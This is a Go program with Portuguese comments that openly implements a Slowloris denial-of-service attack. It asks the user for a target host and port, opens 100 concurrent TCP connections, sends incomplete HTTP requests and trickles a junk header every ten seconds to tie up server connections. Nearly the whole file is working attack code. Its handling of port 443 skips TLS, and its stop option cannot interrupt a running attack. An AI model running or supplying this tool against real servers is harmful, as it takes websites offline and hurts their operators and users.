// ================================
// Autor: Jeiel
//
// Descrição: Este script implementa um ataque Slowloris usando goroutines em Go.
// O objetivo do ataque é manter conexões abertas com um servidor HTTP/HTTPS
// de forma persistente, enviando requisições HTTP parciais, mantendo as conexões ativas,
// e simulando um ataque de negação de serviço (DoS).
//
// O código permite que o usuário insira o IP ou domínio de um servidor alvo,
// e escolha a porta (como 80 ou 443) para iniciar o ataque. As conexões são feitas
// de forma controlada, com um cabeçalho 'User-Agent: Slowloris/1.0' e 'Connection: keep-alive'.
// O ataque pode ser feito com múltiplas conexões simultâneas (com até 100 conexões) e
// mantém a conexão aberta por 10 segundos antes de enviar mais cabeçalhos para manter
// a conexão viva.
//
// O script também oferece a opção de ativar um modo verbose, que exibe informações detalhadas
// sobre as conexões e requisições realizadas.
//
// Data: 08 de dezembro de 2024
// ================================


package main

import (
	"fmt"
	"net"
	"strings"
	"time"
	"sync"
)

func slowlorisAttack(target string, port string, wg *sync.WaitGroup, quit chan bool, verbose bool) {
	defer wg.Done()

	// Se o target inclui o protocolo (https:// ou http://), remova o prefixo
	target = strings.TrimPrefix(target, "http://")
	target = strings.TrimPrefix(target, "https://")

	// Criar a conexão TCP com o servidor
	conn, err := net.Dial("tcp", target+":"+port)
	if err != nil {
		fmt.Println("Erro ao conectar:", err)
		return
	}
	defer conn.Close()

	// Se estiver no modo verbose, mostre a conexão estabelecida
	if verbose {
		fmt.Printf("[VERBOSE] Conexão estabelecida com %s:%s\n", target, port)
	}

	// Criar uma requisição HTTP parcialmente para manter a conexão aberta
	request := "GET / HTTP/1.1\r\n"
	request += "Host: " + target + "\r\n"
	request += "User-Agent: Slowloris/1.0\r\n"  // User-Agent configurado
	request += "Connection: keep-alive\r\n"

	// Enviar a requisição incompleta para manter a conexão aberta
	_, err = conn.Write([]byte(request))
	if err != nil {
		fmt.Println("Erro ao enviar requisição:", err)
		return
	}

	// Se estiver no modo verbose, mostre que a requisição foi enviada
	if verbose {
		fmt.Printf("[VERBOSE] Requisição HTTP enviada para %s:%s\n", target, port)
	}

	// Manter a conexão aberta enviando partes do cabeçalho de forma lenta
	for {
		select {
		case <-quit:
			// Se estiver no modo verbose, mostre quando a goroutine é interrompida
			if verbose {
				fmt.Printf("[VERBOSE] Goroutine encerrada para %s:%s\n", target, port)
			}
			return
		default:
			// Enviar uma parte do cabeçalho HTTP para manter a conexão aberta
			conn.Write([]byte("X-a: b\r\n"))
			if verbose {
				// Exibir que estamos mantendo a conexão aberta
				fmt.Printf("[VERBOSE] Mantendo a conexão aberta com %s:%s\n", target, port)
			}
			time.Sleep(10 * time.Second) // Envia a cada 10 segundos para manter a conexão ativa
		}
	}
}

func main() {
	var wg sync.WaitGroup
	quit := make(chan bool)

	// Solicitar o IP ou domínio e porta de destino ao usuário
	var target string
	var port string
	fmt.Print("Digite o IP ou domínio do alvo: ")
	fmt.Scanln(&target)
	fmt.Print("Digite a porta (exemplo: 80 ou 443): ")
	fmt.Scanln(&port)

	// Perguntar se o usuário deseja ativar o modo verbose
	var verboseInput string
	var verbose bool
	fmt.Print("Deseja ativar o modo verbose (sim/não)? ")
	fmt.Scanln(&verboseInput)

	// Definir se o modo verbose está ativado
	if verboseInput == "sim" {
		verbose = true
	}

	// Controlar quando o ataque começa
	var action string
	for {
		fmt.Print("Digite 'iniciar' para começar o ataque ou 'sair' para encerrar: ")
		fmt.Scanln(&action)

		if action == "sair" {
			fmt.Println("Encerrando o ataque.")
			close(quit)
			break
		}

		if action == "iniciar" {
			// Iniciar as conexões simultâneas
			for i := 0; i < 100; i++ {
				wg.Add(1)
				go slowlorisAttack(target, port, &wg, quit, verbose)
			}

			// Esperar até que todas as goroutines terminem antes de permitir outra entrada
			wg.Wait()
			// Depois de esperar, perguntar novamente se deseja iniciar outro ataque
			fmt.Println("Ataque concluído ou interrompido. Deseja iniciar outro ataque?")
		}
	}
}
